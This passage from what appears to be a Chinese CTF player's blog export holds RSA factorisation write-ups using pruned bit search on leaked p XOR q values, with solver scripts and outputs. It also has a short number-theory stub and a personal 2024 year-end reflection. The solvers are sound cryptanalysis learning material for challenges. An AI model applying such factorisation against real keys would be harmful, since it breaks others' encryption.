class="string">f&#x27;p = <span class="subst">&#123;<span class="built_in">int</span>(ph,<span class="number">2</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;<span class="built_in">int</span>(qh,<span class="number">2</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> xor[l1] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            find(ph+<span class="string">&#x27;0&#x27;</span>,qh+<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            find(ph + <span class="string">&#x27;1&#x27;</span>,qh+<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            find(ph+<span class="string">&#x27;1&#x27;</span>,qh+<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            find(ph + <span class="string">&#x27;0&#x27;</span>,qh+<span class="string">&#x27;0&#x27;</span>)    </span><br><span class="line"></span><br><span class="line">find(ph,qh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 270451921611135557038833183249275131423</span></span><br><span class="line"><span class="string">q = 300510470073047693263940829088190906731</span></span><br><span class="line"><span class="string">p = 300510470073047693263940829088190906731</span></span><br><span class="line"><span class="string">q = 270451921611135557038833183249275131423</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="4，p-q-16）"><a href="#4，p-q-16）" class="headerlink" title="4，p ^(q &gt;&gt; 16）"></a>4，p ^(q &gt;&gt; 16）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret, flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&quot;dasctf&#123;&quot;</span> + secret + <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line">Q = getPrime(<span class="number">512</span>)</span><br><span class="line">N = P * Q</span><br><span class="line">gift = P ^ (Q &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N, gift, <span class="built_in">pow</span>(n, e, N))</span><br><span class="line"><span class="built_in">print</span>(encrypt(bytes_to_long(secret)),</span><br><span class="line">    encrypt(bytes_to_long(flag)))</span><br><span class="line"></span><br><span class="line">N = <span class="number">75000029602085996700582008490482326525611947919932949726582734167668021800854674616074297109962078048435714672088452939300776268788888016125632084529419230038436738761550906906671010312930801751000022200360857089338231002088730471277277319253053479367509575754258003761447489654232217266317081318035524086377</span></span><br><span class="line">gift = <span class="number">8006730615575401350470175601463518481685396114003290299131469001242636369747855817476589805833427855228149768949773065563676033514362512835553274555294034</span></span><br><span class="line"><span class="built_in">pow</span>(n,e,N) = <span class="number">14183763184495367653522884147951054630177015952745593358354098952173965560488104213517563098676028516541915855754066719475487503348914181674929072472238449853082118064823835322313680705889432313419976738694317594843046001448855575986413338142129464525633835911168202553914150009081557835620953018542067857943</span></span><br><span class="line"><span class="built_in">pow</span>(secret,e,n) = <span class="number">69307306970629523181683439240748426263979206546157895088924929426911355406769672385984829784804673821643976780928024209092360092670457978154309402591145689825571209515868435608753923870043647892816574684663993415796465074027369407799009929334083395577490711236614662941070610575313972839165233651342137645009</span></span><br><span class="line"><span class="built_in">pow</span>(flag,e,n) = <span class="number">46997465834324781573963709865566777091686340553483507705539161842460528999282057880362259416654012854237739527277448599755805614622531827257136959664035098209206110290879482726083191005164961200125296999449598766201435057091624225218351537278712880859703730566080874333989361396420522357001928540408351500991</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里只看一下通过剪枝分解n的操作，其实与上一道题差别不大，但是剪枝条件有所变化。</p>
<p>1，(pp ^ (qq &gt;&gt; 16)) % (2 ** l) &#x3D;&#x3D; gift % (2 ** l) </p>
<p>2，pp * qq % (2 ** l) &#x3D;&#x3D; N % (2 ** l)</p>
<p>第二点感觉是都有的，第一点根据题目信息改动即可</p>
<p>tips：因为gift是p异或q右移16位的结果，所以p的最后一位1相当于异或了q的第十七位。这也就是为什么只搜p而不是同时搜p，q，传入的也不是q的末位1而是q的末17位，在调用函数的时候才会有爆破了q后17位的操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N=<span class="number">75000029602085996700582008490482326525611947919932949726582734167668021800854674616074297109962078048435714672088452939300776268788888016125632084529419230038436738761550906906671010312930801751000022200360857089338231002088730471277277319253053479367509575754258003761447489654232217266317081318035524086377</span></span><br><span class="line">gift=<span class="number">8006730615575401350470175601463518481685396114003290299131469001242636369747855817476589805833427855228149768949773065563676033514362512835553274555294034</span></span><br><span class="line">c1=<span class="number">14183763184495367653522884147951054630177015952745593358354098952173965560488104213517563098676028516541915855754066719475487503348914181674929072472238449853082118064823835322313680705889432313419976738694317594843046001448855575986413338142129464525633835911168202553914150009081557835620953018542067857943</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findp</span>(<span class="params">p,q</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p)==<span class="number">512</span>:</span><br><span class="line">        p1=<span class="built_in">int</span>(p,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> N % p1 ==<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(p1,N//p1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bit=<span class="built_in">len</span>(p)</span><br><span class="line">        p1=<span class="built_in">int</span>(p,<span class="number">2</span>)</span><br><span class="line">        q1=<span class="built_in">int</span>(q,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> (p1^(q1&gt;&gt;<span class="number">16</span>))%(<span class="number">2</span>**bit)==gift%(<span class="number">2</span>**bit) <span class="keyword">and</span> p1*q1%(<span class="number">2</span>**bit)==N%(<span class="number">2</span>**bit):<span class="comment">#当目前深搜出来的位数符合实际，继续搜索。</span></span><br><span class="line">            findp(<span class="string">&#x27;1&#x27;</span>+p,<span class="string">&#x27;1&#x27;</span>+q)</span><br><span class="line">            findp(<span class="string">&#x27;0&#x27;</span>+p,<span class="string">&#x27;1&#x27;</span>+q)</span><br><span class="line">            findp(<span class="string">&#x27;0&#x27;</span>+p,<span class="string">&#x27;0&#x27;</span>+q)</span><br><span class="line">            findp(<span class="string">&#x27;1&#x27;</span>+p,<span class="string">&#x27;0&#x27;</span>+q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">17</span>):</span><br><span class="line">    findp(<span class="string">&#x27;1&#x27;</span>,<span class="built_in">bin</span>(i)[<span class="number">2</span>:])<span class="comment">#其中i可以看作q的低位</span></span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>时间关系先暂时收录这四种题型，其实归根结底都是一种问题，即通过p*q&#x3D;n和题目给出的条件进行剪枝分解n，</p>
<p>关于剪枝，其实感觉没有特定的做法，而是一种思想，就是通过各种方法减少搜索规模，从而提高效率。目前遇到的剪枝都是在RSA中，或许其他的密码体系也会有着这种思想存在？</p>
<p>还感觉比较重要的一点是搜索的顺序，剪枝是一种方法，但是有些时候我们可以通过该变搜索的顺序来进一步提高效率，包括上述提到的首尾剪枝，低位向高位剪枝……继续深挖下去发现涉及到更深一步的算法待后续研究。任重而道远捏{}</p>
]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>相关数学基础知识</title>
    <url>/2024/03/25/%E7%9B%B8%E5%85%B3%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="Rabin攻击"><a href="#Rabin攻击" class="headerlink" title="Rabin攻击"></a>Rabin攻击</h1><span id="more"></span>

<p>首先引出二次剩余和欧拉准则，欧拉准则的证明又设计涉及费马小定理，下面一一说明。</p>
<h2 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>若p为素数，gcd(a,p)&#x3D;1,则$a^{p}$≡a(modp),也可写为$a^{p-1}$≡1(modp).</p>
<h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><h2 id="二次剩余"><a href="#二次剩余" class="headerlink" title="二次剩余"></a>二次剩余</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><ul>
<li><p>若<em>p</em>是素数,a<em>不是p</em>的倍数且与一个平方数模p<em>同余,则称a</em>是模p<em>的二次剩余,记作</em>a<em>∈</em>QR</p>
<p>例如$2^{2}$≡4(mod13) 则称4是模13的二次剩余</p>
<p>同样我们把不等于0也不是模p<em>的二次剩余的数称为非二次剩余,记作a</em>∈<em>NR</em></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>2024の总结</title>
    <url>/2024/12/31/2024%E3%81%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>细想来自己开始接触CTF也大半年了，这期间发生了蛮多的事，刚好年末了，顺带写个年终总结吧，不过其实也算不上，毕竟时间跨度不止一年了。</p>
<h1 id="About-CTF"><a href="#About-CTF" class="headerlink" title="About CTF"></a>About CTF</h1><p>  其实严格来说从去年高考完选志愿之前其实都对网络安全这方面 没啥了解(其实唯一的了解就来自某个逆天电视剧)，现在所在的密码科学与技术这个专业也只是第一志愿没录上之后凑数的,当时也只是从各种途径了解到这个专业前景蛮好。具体了解也是一片空白。</p>
<p>  填完志愿的那个暑假，闲着无聊的我在翻学校的公众号时发现了网安协会，当时想着自己也是这方面的加了也挺合适，进群后就看到学长在宣传战队，当时觉得”wc，战队唉，好帅好牛逼“，所以去听了会长的招新宣讲，也就是我们的无敌<a href="https://github.com/Boogipop">Boogipop神！</a>。给当时的我留下了不可磨灭的震撼，看完我直接化身热血小子恨不得直接把某个人电脑黑了看看实力。当时因为自己专业的原因，选择了Crypto方向学习(这个方向黑别人电脑好像难度蛮大哈哈哈哈哈哈哈哈哈)，不过其实暑假并没有学到什么，甚至只看了看古典密码，当时刚结束地狱般的高三玩心太重了根本坐不住hhh，在最后的招新考核中也只做出了一道古典就耻辱下机了，当时连Python完全不会，只会做txt题，看到后缀是.py的文件直接抓瞎哈哈哈。也是不出意外地被刷掉了。当时准大一通过考核的就只有一个，就是这位现在的<a href="http://www.miaoaixuan.cn/">misc✌</a>.</p>
<p> 大一上学期其实都没怎么学，还没摆脱高中思维，只是在按部就班的学高数，考四级这些，没啥好说的，跳过跳过……</p>
<p>  寒假才算真正开始学习，先在图书馆里花一周速成了一下Python，然后跟着BUU上刷了下题，学了学基础的RSA…..然后就去参加考核哩，现在想想当时其实相当于啥都没学，不过多亏考核难度不大，也是成功通过了，成为了HnuSec的一员.</p>
<p>  然后是大一下,这学期打了蛮多比赛的，虽然大部分都是新生赛吧，在打比赛的时候也通过题目学到了很多，我个人觉得这种以赛促学其实蛮有效果的，在对比赛的复现中也学到了好多新知识。从只会套RSA板子解题到可以自己独立做出一些比较难的题，这当然也离不开战队里学长<a href="https://shinichicun.top/">Shin</a>.的培养啦，有不会的问他就对了，简直无所不知！之后嘛也没啥好说的就打比赛，复现这样循环着来了……</p>
<p>  又是一年暑假，其实暑假学的还蛮多，因为之前相当于只是对RSA比较熟悉，所以暑假着重研究了一下其他的加密算法，包括对称密码，椭圆曲线(这个现在还是不太会，算是一个挖了比较久的坑了)。然后给战队的招新赛出了题，也是在暑假，萌生了想加入联合战队的想法，感觉是一个更高的平台吧，认识更多厉害的师傅也能更快的成长，所以暑假的学习似乎也显得更有动力了？(应该吧)</p>
<p>  所以在刚开学的时候也是参加了NepCTF，并在爆零耻辱下机后“厚颜无耻”地交了自己的简历表达了自己想加入Nepnep的想法，经过两个月(漫长)的考核之后也是成功加入了Nepnep，也是完成了自己的一个阶段性目标。这学期也是因为加了战队所以紧迫感也是挺足，或主动或被动的学了一些东西，但是加上校队同届专注打密码的目前好像就我一个，学长大四了也要忙毕设的事情。所以还是有些紧迫感的。最近几天也稍微计划了一下寒假的学习计划，希望不要咕咕……</p>
<p>闲着无聊经常翻其他师傅的博客，时常感叹于别人的的厉害，总是不自量力地换算别人在我这个时候的实力然后被打击第二次。所以怎么说呢。其实“内耗”还挺严重的，经常学着学着就开始莫名emo和焦躁，怀疑自己对于密码的坚持，自己究竟适合吗。总是埋怨自己怎么还在学这么基础的东西，唉。总之希望明年专注于当下吧，不要让别人影响自己（立flag</p>
<h1 id="About-Life"><a href="#About-Life" class="headerlink" title="About Life"></a>About Life</h1><p>谈谈学业，唉一言难尽，保研估计是指望不上了，大四准备考研吧呜呜呜。上学期因为刚接触CTF，有一种莫名的热情，加上各种因素，导致CTF和学业的平衡不是很好，其实回过头来看，属于是技术没学好，学业也落下了。</p>
<p>今年其实过的还是蛮充实的，暑假跟高中同学去西安旅游，几个人喝强爽喝的烂醉(这东西真有问题吧)。然后去了博物院，城墙……。这学期去看了心心念念的许嵩的演唱会。</p>
<p><a href="https://img.tg/image/OEPiR1"><img src="https://ooo.0x0.ooo/2024/12/31/OEPiR1.jpg" alt="OEPiR1.jpg"></a></p>
<p>总的来说是充实的一年www（其实是写到这开始莫名烦躁不想写了）</p>
<h1 id="About-Love"><a href="#About-Love" class="headerlink" title="About Love"></a>About Love</h1><p>关于感情，说来惭愧。已经被甩快两年的我还是忘不掉初恋，这下真成舔狗了唉。再加上另一方面对感情的需求也没有那么强烈。导致我今年一直处在纯宅男状态，上了大学没加几个女生。短时间内估计是就这样了。随缘吧</p>
<h1 id="Future"><a href="#Future" class="headerlink" title="Future"></a>Future</h1><p>奇怪，这总结怎么越写越不想写…..自己的文字能力真是退化的厉害。但还是要展望一下的。希望明年少点精神内耗吧，专注学习密码，顺便希望点一些其他的技能树吧。</p>
]]></content>
      <tags>
        <tag>Thinking</tag>
      </tags>
  </entry>
</search>
